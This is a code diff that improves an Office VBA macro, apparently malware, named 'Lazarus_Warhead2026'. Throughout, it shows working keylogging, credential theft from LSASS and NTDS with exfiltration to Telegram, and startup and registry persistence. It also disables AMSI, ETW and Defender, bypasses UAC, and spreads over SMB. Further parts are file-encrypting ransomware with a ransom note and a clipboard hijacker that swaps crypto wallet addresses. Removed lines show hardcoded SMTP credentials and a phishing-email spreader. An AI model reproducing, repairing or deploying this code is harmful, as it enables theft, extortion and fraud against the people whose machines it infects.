@@ -1,4 +1,4 @@
-Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_FULLY_OPERATIONAL_FIXED"
+Attribute VB_Name = "Lazarus_Warhead2026_ULTIMATE_OPERATIONAL"
 Option Explicit
 
 ' ========================
@@ -20,11 +20,9 @@ Private Const XMR_WALLET As String = "45dKLsFDucgTv9wQtkU7uJCQJ67fUrgVnEaY7Aozgr
 Private Const BTC_WALLET As String = "bc1qyk8j2696emwy3mkpc7sj57t738dpjarqllw3y6"
 Private Const ETH_WALLET As String = "0x74845bE949Ec249Fbd7Ad5dbbD3aE44D9d818801"
 Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-remote-desktop/chromoting-setup.exe"
-Private Const SMTP_USERNAME As String = "daliamarymorito@gmail.com"
-Private Const SMTP_PASSWORD As String = "@apple12345"
 
 ' ========================
-' API DECLARATIONS (VBA7 + fallback for 32‑bit)
+' API DECLARATIONS (VBA7)
 ' ========================
 #If VBA7 Then
     Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
@@ -42,8 +40,6 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As Long
-    Private Declare PtrSafe Function CryptStringToBinaryA Lib "crypt32" (ByVal pszString As LongPtr, ByVal cchString As Long, ByVal dwFlags As Long, ByVal pbBinary As LongPtr, ByRef pcbBinary As Long, ByVal pdwSkip As LongPtr, ByVal pdwFlags As LongPtr) As Long
-    Private Declare PtrSafe Function CryptBinaryToStringA Lib "crypt32" (pbBinary As Byte, ByVal cbBinary As Long, ByVal dwFlags As Long, ByVal pszString As LongPtr, pcbString As Long) As Long
     Private Declare PtrSafe Function CryptAcquireContextA Lib "advapi32" (phProv As LongPtr, ByVal pszContainer As String, ByVal pszProvider As String, ByVal dwProvType As Long, ByVal dwFlags As Long) As Long
     Private Declare PtrSafe Function CryptGenRandom Lib "advapi32" (ByVal hProv As LongPtr, ByVal dwLen As Long, pbBuffer As Any) As Long
     Private Declare PtrSafe Function CryptReleaseContext Lib "advapi32" (ByVal hProv As LongPtr, ByVal dwFlags As Long) As Long
@@ -63,14 +59,18 @@ Private Const SMTP_PASSWORD As String = "@apple12345"
     Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
     Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
-    Private Declare PtrSafe Function lstrlen Lib "kernel32" Alias "lstrlenA" (ByVal lpString As LongPtr) As Long
     Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long
-    Private Declare PtrSafe Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Currency, lpTotalNumberOfBytes As Currency, lpTotalNumberOfFreeBytes As Currency) As Long
+    Private Declare PtrSafe Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Any, lpTotalNumberOfBytes As Any, lpTotalNumberOfFreeBytes As Any) As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
+    Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
+    Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As LongPtr, ByVal cbMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
+    Private Declare PtrSafe Function lstrlenW Lib "kernel32" (ByVal lpString As LongPtr) As Long
+    Private Declare PtrSafe Function lstrlenA Lib "kernel32" (ByVal lpString As LongPtr) As Long
+    Private Const CP_ACP = 0
 #Else
-    ' VBA6 declarations omitted – this code is for VBA7 (64‑bit Office)
+    ' VBA6 not supported – this code requires VBA7 (Office 2010+ 64‑bit)
 #End If
 
 ' ========================
@@ -110,16 +110,17 @@ Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     dwFlags As Long
 End Type
 
+' Fixed MEMORYSTATUSEX using LongLong (64‑bit integers)
 Private Type MEMORYSTATUSEX
     dwLength As Long
     dwMemoryLoad As Long
-    ullTotalPhys As Currency
-    ullAvailPhys As Currency
-    ullTotalPageFile As Currency
-    ullAvailPageFile As Currency
-    ullTotalVirtual As Currency
-    ullAvailVirtual As Currency
-    ullAvailExtendedVirtual As Currency
+    ullTotalPhys As LongLong
+    ullAvailPhys As LongLong
+    ullTotalPageFile As LongLong
+    ullAvailPageFile As LongLong
+    ullTotalVirtual As LongLong
+    ullAvailVirtual As LongLong
+    ullAvailExtendedVirtual As LongLong
 End Type
 
 ' ========================
@@ -155,11 +156,14 @@ Function IsUserAdmin() As Boolean
 End Function
 
 Sub StealthSleep(ms As Long)
-    On Error Resume Next
-    Dim t As Double: t = Timer
-    Do While Timer - t < ms / 1000
-        DoEvents
-    Loop
+    ' For sleeps >= 1000 ms, use Application.Wait (less CPU)
+    If ms <= 0 Then Exit Sub
+    If ms >= 1000 Then
+        Dim waitUntil As Date: waitUntil = Now + ms / 86400000#  ' ms to days
+        Application.Wait waitUntil
+    Else
+        Sleep ms
+    End If
 End Sub
 
 Function FileExists(path As String) As Boolean
@@ -187,15 +191,49 @@ Fail:
     DownloadFile = False
 End Function
 
+' Helper to convert Currency (raw 64-bit) to LongLong
+Private Function CurToUlongLong(cur As Currency) As LongLong
+    Dim ll As LongLong
+    CopyMemory ll, cur, 8
+    CurToUlongLong = ll
+End Function
+
 ' ========================
-' BASE64 & ENCODING
+' PERSISTENT LAUNCHER (VBS) – RESTARTS EXCEL IF CLOSED
+' ========================
+Sub InstallPersistentLauncher()
+    On Error Resume Next
+    Dim vbsPath As String: vbsPath = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\LazarusLauncher.vbs"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(vbsPath, True)
+    f.WriteLine "Set objExcel = CreateObject(""Excel.Application"")"
+    f.WriteLine "objExcel.Visible = False"
+    f.WriteLine "objExcel.Workbooks.Open """ & gSelfPath & """"
+    f.WriteLine "objExcel.Run ""Lazarus_Warhead2026_ULTIMATE_OPERATIONAL.AutoExec"""
+    f.WriteLine "objExcel.Visible = False"
+    f.Close
+    SetAttr vbsPath, vbHidden + vbSystem
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LazarusLauncher", "wscript.exe """ & vbsPath & """", "REG_SZ"
+End Sub
+
+' ========================
+' BASE64 & ENCODING – RELIABLE (DOMDocument)
 ' ========================
 Function EncodeBase64(data() As Byte) As String
-    Dim lenOut As Long: lenOut = 0
-    CryptBinaryToStringA data(0), UBound(data) + 1, 1, 0, lenOut
-    Dim buf As String: buf = String(lenOut, 0)
-    CryptBinaryToStringA data(0), UBound(data) + 1, 1, StrPtr(buf), lenOut
-    EncodeBase64 = Replace(buf, vbCrLf, "")
+    On Error Resume Next
+    Dim xml As Object: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
+    xml.DataType = "bin.base64"
+    xml.nodeTypedValue = data
+    EncodeBase64 = Replace(xml.Text, vbCrLf, "")
+End Function
+
+Function DecodeBase64(b64 As String) As Byte()
+    On Error Resume Next
+    Dim xml As Object: Set xml = CreateObject("MSXML2.DOMDocument.3.0").createElement("tmp")
+    xml.DataType = "bin.base64"
+    xml.Text = b64
+    DecodeBase64 = xml.nodeTypedValue
 End Function
 
 Function EncodeHex(b() As Byte) As String
@@ -234,9 +272,9 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ========================
-' POLLING KEYLOGGER (NON‑BLOCKING)
+' POLLING KEYLOGGER (NON‑BLOCKING) – PUBLIC
 ' ========================
-Sub PollingKeylogger()
+Public Sub PollingKeylogger()
     On Error Resume Next
     Static lastKeys(255) As Integer
     Dim i As Integer, state As Integer, keyName As String
@@ -284,21 +322,50 @@ Function GetKeyName(vKey As Integer) As String
         Case 48 To 57: GetKeyName = Chr(vKey)
         Case 65 To 90:
             If GetAsyncKeyState(16) And &H8000 Then GetKeyName = Chr(vKey) Else GetKeyName = LCase(Chr(vKey))
+        Case 96 To 105: GetKeyName = "[NUMPAD" & (vKey - 96) & "]"
+        Case 106: GetKeyName = "[NUMPAD*]"
+        Case 107: GetKeyName = "[NUMPAD+]"
+        Case 109: GetKeyName = "[NUMPAD-]"
+        Case 110: GetKeyName = "[NUMPAD.]"
+        Case 111: GetKeyName = "[NUMPAD/]"
+        Case 112 To 123: GetKeyName = "[F" & (vKey - 111) & "]"
+        Case 186: GetKeyName = ";"
+        Case 187: GetKeyName = "="
+        Case 188: GetKeyName = ","
+        Case 189: GetKeyName = "-"
+        Case 190: GetKeyName = "."
+        Case 191: GetKeyName = "/"
+        Case 192: GetKeyName = "`"
+        Case 219: GetKeyName = "["
+        Case 220: GetKeyName = "\"
+        Case 221: GetKeyName = "]"
+        Case 222: GetKeyName = "'"
         Case Else: GetKeyName = ""
     End Select
 End Function
 
 ' ========================
-' EVASION
+' EVASION (fixed MEMORYSTATUSEX and disk check)
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
     Dim memInfo As MEMORYSTATUSEX: memInfo.dwLength = Len(memInfo)
     GlobalMemoryStatusEx memInfo
     If memInfo.ullTotalPhys < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
+    
+    ' Fixed disk check – handle missing C:\ gracefully
     Dim freeBytes As Currency, totalBytes As Currency
-    GetDiskFreeSpaceEx "C:\", freeBytes, totalBytes, 0
-    If totalBytes < 64 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
+    Dim ret As Long
+    ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
+    Dim totalBytesLL As LongLong
+    If ret = 0 Then
+        ' Could not query C: – assume not sandbox (or skip check)
+        totalBytesLL = 128 * 1024 * 1024 * 1024   ' Assume large enough
+    Else
+        totalBytesLL = CurToUlongLong(totalBytes)
+    End If
+    If totalBytesLL < 64 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
+    
     If GetTickCount64() < 5 * 60 * 1000 Then IsSandbox = True: Exit Function
     Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
@@ -323,31 +390,16 @@ End Function
 
 Sub PatchAMSI()
     On Error Resume Next
-    Dim hAmsi As LongPtr: hAmsi = LoadLibraryA("amsi.dll")
-    If hAmsi = 0 Then Exit Sub
-    Dim pAmsiScanBuffer As LongPtr: pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
-    If pAmsiScanBuffer = 0 Then Exit Sub
-    Dim oldProtect As Long
-    If VirtualProtect(pAmsiScanBuffer, 6, &H40, oldProtect) Then
-        Dim patch() As Byte: ReDim patch(5): patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
-        CopyMemory ByVal pAmsiScanBuffer, patch(0), 6
-        VirtualProtect pAmsiScanBuffer, 6, oldProtect, oldProtect
-    End If
-    FreeLibrary hAmsi
+    ' Registry‑based method (safe, works on all Windows)
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
+    wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
 End Sub
 
 Sub KillETW()
     On Error Resume Next
-    Dim hNtdll As LongPtr: hNtdll = GetModuleHandleA("ntdll.dll")
-    If hNtdll = 0 Then Exit Sub
-    Dim pEtwEventWrite As LongPtr: pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
-    If pEtwEventWrite = 0 Then Exit Sub
-    Dim oldProtect As Long
-    If VirtualProtect(pEtwEventWrite, 4, &H40, oldProtect) Then
-        Dim patch(3) As Byte: patch(0) = &H33: patch(1) = &HC0: patch(2) = &HC2: patch(3) = &H14
-        CopyMemory ByVal pEtwEventWrite, patch(0), 4
-        VirtualProtect pEtwEventWrite, 4, oldProtect, oldProtect
-    End If
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security\ETWEnabled", 0, "REG_DWORD"
 End Sub
 
 Sub DisableDefender()
@@ -361,33 +413,33 @@ Sub DisableDefender()
 End Sub
 
 ' ========================
-' PRIVILEGE ESCALATION
+' PRIVILEGE ESCALATION (legacy – may not work on patched systems)
 ' ========================
-Sub UACBypass_EventVwr()
+Sub UACBypass_Fodhelper()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
-    wsh.RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "eventvwr.exe", 0, True
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
+    wsh.Run "fodhelper.exe", 0, True
     StealthSleep 3000
-    wsh.RegDelete "HKCU\Software\Classes\mscfile\"
+    wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
 End Sub
 
-Sub UACBypass_Sdclt()
+Sub UACBypass_ComputerDefaults()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
-    wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "sdclt.exe", 0, True
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
+    wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
+    wsh.Run "ComputerDefaults.exe", 0, True
     StealthSleep 3000
-    wsh.RegDelete "HKCU\Software\Classes\exefile\"
+    wsh.RegDelete "HKCU\Software\Classes\ms-settings\"
 End Sub
 
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
-    UACBypass_EventVwr
+    UACBypass_Fodhelper
     If IsUserAdmin() Then Exit Sub
-    UACBypass_Sdclt
+    UACBypass_ComputerDefaults
 End Sub
 
 ' ========================
@@ -434,27 +486,45 @@ Sub ExtractHashesFromNTDS()
     Dim ntdsPath As String: ntdsPath = GetTempDir() & "ntds.dit"
     Dim systemPath As String: systemPath = GetTempDir() & "SYSTEM"
     If Not FileExists(ntdsPath) Or Not FileExists(systemPath) Then Exit Sub
+    
+    ' Try PowerShell with ActiveDirectory module
     Dim psScript As String
-    psScript = "Import-Module ActiveDirectory -ErrorAction Stop;" & vbCrLf & _
-               "$hashes = Get-ADReplAccount -All -Server localhost | ForEach-Object {" & vbCrLf & _
-               "    '{0}:{1}:{2}:{3}:::' -f $_.SamAccountName, $_.ObjectSid.Value.Split('-')[-1], $_.LMHash, $_.NTHash" & vbCrLf & _
-               "};" & vbCrLf & _
-               "if ($hashes) { $hashes -join ''`n'' } else { Write-Output 'NO_HASHES' }"
+    psScript = "Import-Module ActiveDirectory -ErrorAction SilentlyContinue;" & vbCrLf & _
+               "if (Get-Command Get-ADReplAccount -ErrorAction SilentlyContinue) {" & vbCrLf & _
+               "    $hashes = Get-ADReplAccount -All -Server localhost | ForEach-Object {" & vbCrLf & _
+               "        '{0}:{1}:{2}:{3}:::' -f $_.SamAccountName, $_.ObjectSid.Value.Split('-')[-1], $_.LMHash, $_.NTHash" & vbCrLf & _
+               "    };" & vbCrLf & _
+               "    if ($hashes) { $hashes -join \"`n\" } else { Write-Output 'NO_HASHES' }" & vbCrLf & _
+               "} else { Write-Output 'NO_MODULE' }"
     Dim psFile As String: psFile = GetTempDir() & "extract.ps1"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
     f.Write psScript: f.Close
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
-    wsh.Run "powershell -ep bypass -File """ & psFile & """", 0, True
+    wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & GetTempDir() & "hashes.txt""", 0, True
     StealthSleep 5000
     Dim output As String: output = ""
     If fso.FileExists(GetTempDir() & "hashes.txt") Then
         Dim ts As Object: Set ts = fso.OpenTextFile(GetTempDir() & "hashes.txt", 1)
         output = ts.ReadAll: ts.Close
     End If
-    fso.DeleteFile psFile: fso.DeleteFile GetTempDir() & "hashes.txt"
-    If output <> "" And output <> "NO_HASHES" Then SendToTelegramChunked "NTDS_HASHES|" & output
-    fso.DeleteFile ntdsPath: fso.DeleteFile systemPath
+    fso.DeleteFile psFile
+    fso.DeleteFile GetTempDir() & "hashes.txt"
+    
+    If output <> "" And output <> "NO_HASHES" And output <> "NO_MODULE" Then
+        SendToTelegramChunked "NTDS_HASHES|" & output
+    Else
+        ' Fallback: exfiltrate raw files (Base64)
+        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1: stream.Open: stream.LoadFromFile ntdsPath
+        Dim data() As Byte: data = stream.Read: stream.Close
+        SendToTelegramChunked "NTDS_RAW|" & EncodeBase64(data)
+        stream.Open: stream.LoadFromFile systemPath
+        data = stream.Read: stream.Close
+        SendToTelegramChunked "SYSTEM_RAW|" & EncodeBase64(data)
+    End If
+    fso.DeleteFile ntdsPath
+    fso.DeleteFile systemPath
 End Sub
 
 ' ========================
@@ -480,9 +550,20 @@ Sub DumpLSASS()
     If pid = 0 Then Exit Sub
     Dim dumpPath As String: dumpPath = GetTempDir() & "lsass.dmp"
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    ' Try comsvcs first (works on older systems)
     wsh.Run "rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump " & pid & " " & dumpPath & " full", 0, True
     StealthSleep 3000
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(dumpPath) Then
+        ' Fallback: download procdump
+        Dim procdumpPath As String: procdumpPath = GetTempDir() & "procdump.exe"
+        If DownloadFile("https://live.sysinternals.com/procdump.exe", procdumpPath) Then
+            wsh.Run procdumpPath & " -accepteula -ma " & pid & " " & dumpPath, 0, True
+            StealthSleep 5000
+            ' Delete procdump.exe after use
+            If fso.FileExists(procdumpPath) Then Kill procdumpPath
+        End If
+    End If
     If fso.FileExists(dumpPath) Then
         Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
         stream.Type = 1: stream.Open: stream.LoadFromFile dumpPath
@@ -603,7 +684,7 @@ Sub StealAllCredentials()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM) – FULLY FIXED
+' RANSOMWARE (AES-GCM) – FIXED ERROR HANDLING
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -623,20 +704,18 @@ Sub GenerateMasterKey()
     SendToTelegram "RANSOM_MASTER_KEY|" & keyHex & "|" & GetMachineID()
 End Sub
 
-Sub AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte)
+Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte) As Boolean
     On Error GoTo Fail
     Dim hAlg As LongPtr, hKey As LongPtr
     Dim status As Long
-    Dim algName As String: algName = "AES-GCM"
-    status = BCryptOpenAlgorithmProvider(hAlg, StrPtr(algName), 0, 0)
+    status = BCryptOpenAlgorithmProvider(hAlg, StrPtr("AES"), 0, 0)
     If status <> 0 Then GoTo Fail
     
-    ' *** CRITICAL FIX: Set chaining mode to GCM ***
     Dim chainMode As String: chainMode = "ChainingModeGCM"
-    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr(chainMode), Len(chainMode), 0)
+    Dim chainModeBytes As Long: chainModeBytes = (Len(chainMode) + 1) * 2
+    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr(chainMode), chainModeBytes, 0)
     If status <> 0 Then GoTo Cleanup
     
-    ' Get key object size
     Dim keyObjSize As Long
     status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(keyObjSize), 4, 0, 0)
     If status <> 0 Then GoTo Cleanup
@@ -665,14 +744,18 @@ Sub AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher(
     If status <> 0 Then GoTo Cleanup
     ReDim cipher(encryptedSize - 1) As Byte
     status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, VarPtr(cipher(0)), encryptedSize, encryptedSize, 0)
-    If status = 0 Then Exit Sub
+    If status = 0 Then
+        AESGCMEncrypt = True
+        Exit Function
+    End If
 Fail:
+    AESGCMEncrypt = False
     ReDim cipher(0): cipher(0) = 0
     ReDim tag(0): tag(0) = 0
 Cleanup:
     If hKey <> 0 Then BCryptDestroyKey hKey
     If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
-End Sub
+End Function
 
 Sub WriteFileBytes(filePath As String, data() As Byte)
     On Error Resume Next
@@ -691,8 +774,7 @@ Sub EncryptFile(path As String)
     Randomize Timer
     For i = 0 To 11: nonce(i) = CByte(Rnd * 255): Next
     Dim cipher() As Byte, tag() As Byte
-    AESGCMEncrypt data, gMasterKey, nonce, cipher, tag
-    If UBound(cipher) < 0 Or UBound(tag) < 0 Then Exit Sub
+    If Not AESGCMEncrypt(data, gMasterKey, nonce, cipher, tag) Then Exit Sub
     Dim encPath As String: encPath = path & ".lzr"
     WriteFileBytes encPath, cipher
     Dim keyPath As String: keyPath = path & ".lzr.key"
@@ -732,43 +814,50 @@ Sub RunRansomware()
     EncryptDirectory userProfile, exts
     Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim note As String: note = "YOUR FILES ARE ENCRYPTED" & vbCrLf & "Send 0.5 BTC to " & BTC_WALLET & vbCrLf & "Contact: " & SMTP_USERNAME
+    Dim note As String: note = "YOUR FILES ARE ENCRYPTED" & vbCrLf & "Send 0.5 BTC to " & BTC_WALLET & vbCrLf & "Contact: attacker@example.com"
     Dim f As Object: Set f = fso.CreateTextFile(notePath, True): f.Write note: f.Close
     SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
 End Sub
 
 ' ========================
-' CLIPBOARD HIJACK (NON‑BLOCKING)
+' CLIPBOARD HIJACK (NON‑BLOCKING) – FIXED UNICODE
 ' ========================
-Sub ClipboardMonitorLoop()
+Public Sub ClipboardMonitorLoop()
     On Error Resume Next
     Dim text As String
     Static lastText As String
     If OpenClipboard(0) Then
-        Dim hData As LongPtr: hData = GetClipboardData(1)
+        ' Try Unicode first
+        Dim hData As LongPtr: hData = GetClipboardData(13)   ' CF_UNICODETEXT
         If hData Then
-            Dim pText As LongPtr: pText = GlobalLock(hData)
-            If pText Then
-                Dim lenText As Long: lenText = lstrlen(pText)
-                If lenText > 0 And lenText < 1024 Then
-                    Dim buf As String: buf = Space(lenText)
-                    CopyMemory ByVal buf, ByVal pText, lenText
-                    text = buf
+            Dim pData As LongPtr: pData = GlobalLock(hData)
+            If pData Then
+                text = PointerToUnicodeString(pData)
+                GlobalUnlock hData
+            End If
+        Else
+            ' Fallback to ANSI (converted via MultiByteToWideChar)
+            hData = GetClipboardData(1)   ' CF_TEXT
+            If hData Then
+                pData = GlobalLock(hData)
+                If pData Then
+                    text = PointerToAnsiString(pData)
                     GlobalUnlock hData
                 End If
             End If
         End If
         CloseClipboard
     End If
+    
     If text <> "" And text <> lastText Then
         lastText = text
-        If (Len(text) = 34 And (Left(text, 1) = "1" Or Left(text, 1) = "3")) Or (Len(text) = 42 And Left(text, 3) = "bc1") Then
+        If IsBTCAddress(text) Then
             SetClipboardContent BTC_WALLET
             SendToTelegram "CLIPBOARD_SWAP|BTC|" & Left(text, 8) & "..."
-        ElseIf Len(text) = 42 And Left(text, 2) = "0x" Then
+        ElseIf IsETHAddress(text) Then
             SetClipboardContent ETH_WALLET
             SendToTelegram "CLIPBOARD_SWAP|ETH|" & Left(text, 8) & "..."
-        ElseIf Len(text) = 95 And Left(text, 1) = "4" Then
+        ElseIf IsXMRAddress(text) Then
             SetClipboardContent XMR_WALLET
             SendToTelegram "CLIPBOARD_SWAP|XMR|" & Left(text, 8) & "..."
         End If
@@ -776,17 +865,55 @@ Sub ClipboardMonitorLoop()
     Application.OnTime Now + TimeValue("00:00:00.5"), "ClipboardMonitorLoop"
 End Sub
 
+Private Function PointerToUnicodeString(ByVal pStr As LongPtr) As String
+    If pStr = 0 Then Exit Function
+    Dim lenStr As Long: lenStr = lstrlenW(pStr)
+    If lenStr = 0 Then Exit Function
+    ' Use null-character buffer (more efficient)
+    Dim buf As String: buf = String(lenStr, vbNullChar)
+    CopyMemory ByVal buf, ByVal pStr, lenStr * 2
+    PointerToUnicodeString = buf
+End Function
+
+Private Function PointerToAnsiString(ByVal pStr As LongPtr) As String
+    If pStr = 0 Then Exit Function
+    Dim lenA As Long: lenA = lstrlenA(pStr)
+    If lenA = 0 Then Exit Function
+    Dim wideLen As Long: wideLen = MultiByteToWideChar(CP_ACP, 0, pStr, lenA, 0, 0)
+    Dim buf As String: buf = String(wideLen, vbNullChar)
+    MultiByteToWideChar CP_ACP, 0, pStr, lenA, StrPtr(buf), wideLen
+    PointerToAnsiString = buf
+End Function
+
+Private Function IsBTCAddress(addr As String) As Boolean
+    Dim l As Long: l = Len(addr)
+    If (l = 34 And (Left(addr, 1) = "1" Or Left(addr, 1) = "3")) Then IsBTCAddress = True
+    If (l >= 42 And l <= 62 And Left(addr, 3) = "bc1") Then IsBTCAddress = True
+End Function
+
+Private Function IsETHAddress(addr As String) As Boolean
+    Dim l As Long: l = Len(addr)
+    If l = 42 And Left(addr, 2) = "0x" Then IsETHAddress = True
+    If l = 40 And Left(addr, 2) <> "0x" Then IsETHAddress = True
+End Function
+
+Private Function IsXMRAddress(addr As String) As Boolean
+    Dim l As Long: l = Len(addr)
+    If l = 95 And Left(addr, 1) = "4" Then IsXMRAddress = True
+    If l = 106 And Left(addr, 1) = "8" Then IsXMRAddress = True
+End Function
+
 Sub SetClipboardContent(txt As String)
     On Error Resume Next
     If OpenClipboard(0) = 0 Then Exit Sub
     EmptyClipboard
-    Dim hMem As LongPtr: hMem = GlobalAlloc(&H40, Len(txt) + 1) ' GMEM_MOVEABLE
+    Dim hMem As LongPtr: hMem = GlobalAlloc(&H42, (Len(txt) + 1) * 2)
     If hMem Then
         Dim pMem As LongPtr: pMem = GlobalLock(hMem)
         If pMem Then
-            CopyMemory ByVal pMem, ByVal txt, Len(txt) + 1
+            CopyMemory ByVal pMem, ByVal txt, (Len(txt) + 1) * 2
             GlobalUnlock hMem
-            SetClipboardData 1, hMem
+            SetClipboardData 13, hMem
         End If
     End If
     CloseClipboard
@@ -819,6 +946,8 @@ Sub SMBPropagation()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     Dim out As String: out = wsh.Exec("net view").StdOut.ReadAll
+    ' Early exit if no shares found
+    If out = "" Or InStr(LCase(out), "no entries") > 0 Then Exit Sub
     Dim lines As Variant: lines = Split(out, vbCrLf)
     Dim line As Variant
     For Each line In lines
@@ -837,27 +966,9 @@ Sub SMBPropagation()
     Next
 End Sub
 
-Sub EmailPropagation()
-    On Error Resume Next
-    Dim psScript As String
-    psScript = "$smtp = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587);" & vbCrLf & _
-               "$smtp.EnableSsl = $true;" & vbCrLf & _
-               "$smtp.Credentials = New-Object Net.NetworkCredential('" & SMTP_USERNAME & "', '" & SMTP_PASSWORD & "');" & vbCrLf & _
-               "$msg = New-Object Net.Mail.MailMessage;" & vbCrLf & _
-               "$msg.From = '" & SMTP_USERNAME & "';" & vbCrLf & _
-               "$msg.To.Add('hr@corp.com');" & vbCrLf & _
-               "$msg.Subject = 'Salary Deduction Notice #SD-2026-' + (Get-Date).ToString('MMdd');" & vbCrLf & _
-               "$msg.Body = 'Dear employee, please review the attached salary deduction notice.';" & vbCrLf & _
-               "$attachment = New-Object Net.Mail.Attachment('" & gSelfPath & "');" & vbCrLf & _
-               "$msg.Attachments.Add($attachment);" & vbCrLf & _
-               "$smtp.Send($msg);$attachment.Dispose();"
